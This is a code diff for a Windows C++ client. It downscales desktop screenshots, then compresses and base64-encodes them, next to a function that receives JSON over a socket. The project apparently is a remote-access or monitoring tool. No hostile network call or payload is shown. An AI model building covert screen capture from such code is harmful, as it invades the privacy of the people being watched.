@@ -1,21 +1,52 @@
 #include "Utils.h"
 
-const int BUFFER_SIZE = 4096;
+const int BUFFER_SIZE = 8196;
 
 using json = nlohmann::json;
 
+void device::ErrorWindow(const std::string& message)
+{
+    MessageBoxA(nullptr, message.c_str(), "Error", MB_OK | MB_ICONERROR);
+}
+
+// Made for screenshot function mainly
 std::string networking::compressData(const std::vector<char>& data)
 { 
-       
+    z_stream deflate_s;
 
-    //std::string compressedData = compressedDataStream.str();
-    //std::string base64Data = cppcodec::base64_rfc4648::encode(compressedData);
+    deflate_s.zalloc = Z_NULL;
+    deflate_s.zfree = Z_NULL;
+    deflate_s.opaque = Z_NULL;
+    deflate_s.avail_in = data.size(); // size of input
+    deflate_s.next_in = (Bytef *)data.data(); // input char array
 
-    //std::cout << "[+] Data compressed successfully!\n";
+    if(deflateInit(&deflate_s, Z_BEST_COMPRESSION) != Z_OK)
+    {
+        device::ErrorWindow("Failed to initialize zlib");
+        return "";
+    }
 
-    //return base64Data;
-    
-   //return "";
+    std::vector<char> compressedData;
+    const size_t BUFSIZE = 128 * 1024;
+    Bytef temp_buffer[BUFSIZE];
+
+    do 
+    {
+        deflate_s.avail_out = BUFSIZE;
+        deflate_s.next_out = temp_buffer;
+        deflate(&deflate_s, Z_FINISH);
+        size_t compressed_size = BUFSIZE - deflate_s.avail_out;
+        for(size_t i = 0; i < compressed_size; i++)
+        {
+            compressedData.push_back(temp_buffer[i]);
+        }
+    } while(deflate_s.avail_out == 0);
+
+    deflateEnd(&deflate_s);
+
+    std::string encodedString = base64::encode(compressedData.data(), compressedData.size());
+
+    return encodedString;
 }
 
 json networking::recvData(SOCKET clientSocket)
@@ -177,6 +208,17 @@ void capture::screenshot()
     SelectObject(hCaptureDC, hCaptureBitmap);
     BitBlt(hCaptureDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);
 
+    // Create a new bitmap with lower resolution
+    int newWidth = screenWidth / 4; // adjust as needed
+    int newHeight = screenHeight / 4; // adjust as needed
+    HBITMAP hLowResBitmap = CreateCompatibleBitmap(hDesktopDC, newWidth, newHeight);
+    HDC hLowResDC = CreateCompatibleDC(hDesktopDC);
+    SelectObject(hLowResDC, hLowResBitmap);
+
+    // Copy the original bitmap to the new bitmap with scaling
+    SetStretchBltMode(hLowResDC, COLORONCOLOR);
+    StretchBlt(hLowResDC, 0, 0, newWidth, newHeight, hCaptureDC, 0, 0, screenWidth, screenHeight, SRCCOPY);
+
     // Convert the screenshot to a WIC bitmap
     IWICImagingFactory* pFactory = nullptr;
     CoInitialize(nullptr);
@@ -186,20 +228,22 @@ void capture::screenshot()
         CLSCTX_INPROC_SERVER,
         IID_PPV_ARGS(&pFactory)
     );
-
+    
     IWICBitmap* pBitmap = nullptr;
-    pFactory->CreateBitmapFromHBITMAP(hCaptureBitmap, nullptr, WICBitmapUseAlpha, &pBitmap);
-
+    pFactory->CreateBitmapFromHBITMAP(hLowResBitmap, nullptr, WICBitmapUseAlpha, &pBitmap);
+    
     // Save the screenshot to the working directory as PNG
     SaveScreenshotToWorkingDirectory(pBitmap);
-
+    
     // Release resources
     DeleteDC(hCaptureDC);
-    DeleteObject(hCaptureBitmap);
+    DeleteDC(hLowResDC);
+    DeleteObject(hLowResBitmap); // delete hLowResBitmap first
+    DeleteObject(hCaptureBitmap); // then delete hCaptureBitmap
     ReleaseDC(hDesktopWnd, hDesktopDC);
     pFactory->Release();
     pBitmap->Release();
-
+    
     CoUninitialize();
 }
 
